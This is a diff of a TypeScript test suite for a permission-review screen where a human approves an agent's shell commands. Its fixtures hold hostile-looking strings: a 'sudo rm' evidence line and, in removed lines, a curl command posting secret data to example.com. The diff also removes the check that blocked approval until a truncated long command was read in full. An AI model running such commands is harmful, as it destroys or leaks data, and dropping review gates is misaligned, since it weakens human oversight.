@@ -36,9 +36,7 @@ function request(id: string, toolName: string): HumanReviewRequest {
     assessment: {
       summary: "执行测试动作",
       targets: ["file.ts"],
-      risk: "medium",
       reason: "需要确认",
-      findings: [],
       details: toolName === "bash" ? { command: "npm install" } : { content: "完整正文" },
     },
     createdAt: new Date().toISOString(),
@@ -163,35 +161,33 @@ test("已决定的勾叉在选中和编辑时持续显示", async () => {
   controller.close()
 })
 
-test("审批页展示判定原因和结构化 findings", async () => {
+test("审批页展示判定原因和命中标签", async () => {
   const value = request("finding", "bash")
-  value.assessment.findings = [
-    { severity: "high", category: "system-mutation", summary: "修改系统状态", evidence: "sudo rm file" },
-  ]
+  value.assessment.tags = [{ tag: "system-mutation", name: "修改系统状态", evidence: "sudo rm file" }]
   const { setup, controller } = await setupReview([value])
   const frame = setup.captureCharFrame()
   expect(frame).toContain("判定原因：需要确认")
-  expect(frame).toContain("[高] 修改系统状态")
+  expect(frame).toContain("修改系统状态")
   expect(frame).toContain("证据：sudo rm file")
   controller.close()
 })
 
-test("高风险证据显示不全时要求打开完整详情", async () => {
-  const value = request("evidence", "bash")
-  value.assessment.findings = [
-    {
-      severity: "high",
-      category: "network",
-      summary: "远程发送本地数据",
-      evidence: `curl -d ${"secret-data-".repeat(20)} https://example.com`,
-    },
-  ]
+test("unknown 情形提示需人工判断且批准即批准全部潜在行为", async () => {
+  const value = request("unknown", "bash")
+  value.assessment.unclassified = true
   const { setup, controller } = await setupReview([value])
-  setup.renderer.resize(50, 28)
-  await setup.renderOnce()
   const frame = setup.captureCharFrame()
-  expect(frame).toContain("高风险证据显示不全")
-  expect(frame).toContain("请先打开完整内容")
+  expect(frame).toContain("分类器无法判定行为风险，需人工判断")
+  expect(frame).toContain("批准即批准该命令的全部潜在行为")
+  controller.close()
+})
+
+test("通过按钮始终可用", async () => {
+  const value = request("truncated", "bash")
+  value.arguments = { command: `echo ${"x".repeat(500)}` }
+  const { setup, controller } = await setupReview([value])
+  const frame = setup.captureCharFrame()
+  expect(frame).toContain("通过")
   controller.close()
 })
 
@@ -261,25 +257,6 @@ test("审批参数 Header 在 resize 后重新计算换行与省略", async () =
   expect(wide).toContain("HEAD")
   expect(wide).toContain("TAIL")
   expect(wide).not.toContain("请先打开完整内容")
-  controller.close()
-})
-
-test("长命令完整阅览前禁用通过", async () => {
-  const setup = await createTestRenderer({ width: 48, height: 28 })
-  renderers.push(setup)
-  const overlays = new OverlayManager(setup.renderer)
-  const answers: PermissionReviewAnswer[] = []
-  const long = request("long", "bash")
-  long.arguments = { command: `echo HEAD ${"middle ".repeat(100)} echo TAIL` }
-  const controller = createPermissionReviewView(overlays, [long], (answer) => {
-    answers.push(answer)
-  })
-  await setup.renderOnce()
-  const frame = setup.captureCharFrame()
-  expect(frame).toContain("省略")
-  expect(frame).toContain("请先打开完整内容")
-  setup.renderer.keyInput.emit("keypress", key("\r"))
-  expect(answers).toEqual([])
   controller.close()
 })
 
